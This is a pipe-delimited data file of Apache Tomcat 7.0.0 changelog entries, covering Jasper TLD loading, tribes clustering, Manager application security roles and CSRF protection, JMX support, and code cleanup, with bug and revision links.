Jasper|Tomcat 7.0.0 (markt)|add|48689|Access TLD files through a new JarResource interface to make extending Jasper simpler, particularly in OSGi environments. Patch provided by Jarek Gawor. (markt)|Jar abstraction for Jasper|Jasper can load TLD files through the ServletContext or from a Jar file. To load TLDs from Jar file, an URL to a Jar file must be passed. However, in some environments (e.g. in OSGi) it might not be easy to provide an URL to a jar file. It would be nice to abstract the way Jasper is looking up the embedded TLDs so that different ways of looking up TLDs within Jar files or Bundles or whatever could be used.|https://bz.apache.org/bugzilla/show_bug.cgi?id=48689
High Availability|Tomcat 7.0.0 (markt)|add||Add support for UDP and secure communication to tribes. (fhanik)|||
High Availability|Tomcat 7.0.0 (markt)|add||Add versioning to the tribes communication protocol to support future developments. (fhanik)|||
High Availability|Tomcat 7.0.0 (markt)|add||Add a demo on how to use the payload. (fhanik)|||
High Availability|Tomcat 7.0.0 (markt)|add||Started to add JMX support to the cluster implementation. (markt)|||
High Availability|Tomcat 7.0.0 (markt)|fix||r609778 Minor fixes to the throughput interceptor and the NIO receiver. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=609778
High Availability|Tomcat 7.0.0 (markt)|fix||r630234 Additional checks for the NIO receiver. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=630234
High Availability|Tomcat 7.0.0 (markt)|update||r671650 Improve error message when multicast is not enabled. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=671650
Web applications|Tomcat 7.0.0 (markt)|update||r631321 Update changelog to support the <rev> element in the documentation. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=631321
Web applications|Tomcat 7.0.0 (markt)|add||A number of additional roles were added to the Manager and Host Manager applications to separate out permissions for the HTML interface, the text interface and the JMX proxy. (markt)|||
Web applications|Tomcat 7.0.0 (markt)|add||CSRF protection was added to the Manager and Host Manager applications. (markt)|||
Web applications|Tomcat 7.0.0 (markt)|add||List array elements in the JMX proxy output of the Manager application. (rjung)|||
Extras|Tomcat 7.0.0 (markt)|add||A new JmxRemoteLifecycleListener that can be used to fix the ports used for remote JMX connections, e.g. when using JConsole. (markt)|||
Other|Tomcat 7.0.0 (markt)|fix||Numerous code clean-up changes including the use of generics and removing unused imports, fields, parameters and methods. (markt)|||
Other|Tomcat 7.0.0 (markt)|fix||All deprecated internal code has been removed. Warning: If you have custom components for a previous Tomcat version that extend internal Tomcat classes and override deprecated methods it is highly likely that they will no longer work. (markt)|||
Other|Tomcat 7.0.0 (markt)|update||Parameterize version number throughout build scripts and source. (rjung)|||
Other|Tomcat 7.0.0 (markt)|add||r766526 Add support for setting up an additional PropertySource that is used to lookup parameters referenced as ${..} in XML files parsed by Tomcat. It is configured via org.apache.tomcat.util.digester.PROPERTY_SOURCE system property. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=766526
